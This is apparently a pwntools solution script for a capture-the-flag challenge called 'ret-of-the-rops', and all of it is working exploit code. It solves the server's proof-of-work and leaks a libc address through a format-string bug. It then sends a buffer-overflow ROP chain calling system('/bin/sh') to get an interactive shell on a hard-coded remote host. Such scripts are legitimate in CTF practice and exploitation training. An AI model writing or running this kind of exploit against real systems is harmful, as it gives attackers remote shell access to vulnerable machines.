from powsolver import PoWSolver
from pwn import gdb, remote, process, log, args, ROP, ELF, FmtStr, p64, context, fmtstr_payload, fmtstr


context.arch = 'amd64'
FILE = './ret-of-the-rops'
BINARY = ELF(FILE)
LIBC = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')
OFFSET = b'A' * 32

COMMANDS = [
    'b printf@plt'
]
main = BINARY.sym.main

def start():
    if args.REMOTE:
        return remote('161.97.176.150', 2222)

    return process(FILE, env={"LD_LIBRARY_PATH": "./libc6_2.31-0ubuntu9.2_amd64.so"})

def attach_gdb():
    if args.REMOTE or args.NOTRACE:
        return

    commands = '\n'.join(COMMANDS)
    gdb.attach(p, commands)


def leak_address(index):
    payload = '%{}$p'.format(index).encode() + OFFSET[:-4] + p64(main)
    p.sendline(payload)

    recv = p.recvline()
    output = recv[:14]

    return output


p = start()

################################################################################
# SOLVE THE PoW
#################################################################################
if args.REMOTE:
    proof_of_work = p.recvline().replace(b'MD5', b'md5')
    solver = PoWSolver()
    solver.parse(
        "Proof of work: Submit a lowercase alphabetical string X, of length {len}, where {alg}(X)[{start:d}:] = {target}",
        proof_of_work.decode()
    )
    sol = solver.solve()
    p.sendline(sol)
    p.recvline()

################################################################################
# EXPLOIT
################################################################################
p.recvline()

log.info('Phase 0x1: leaking libc base address')
output = leak_address(3)
log.success('Got leak! {}: {}'.format(3, output))

base_addr = int(output, 0) - LIBC.sym['_IO_2_1_stdin_']

log.success('Got libc base addr: 0x{:02x}'.format(base_addr))
attach_gdb()

log.info('Phase 0x2: ROP')
LIBC.address = base_addr
system = LIBC.sym.system
binsh = next(LIBC.search(b'/bin/sh\0'))
log.info('Preparing ROP chain')
rop = ROP(BINARY)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
payload = OFFSET + (b'B'*8) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
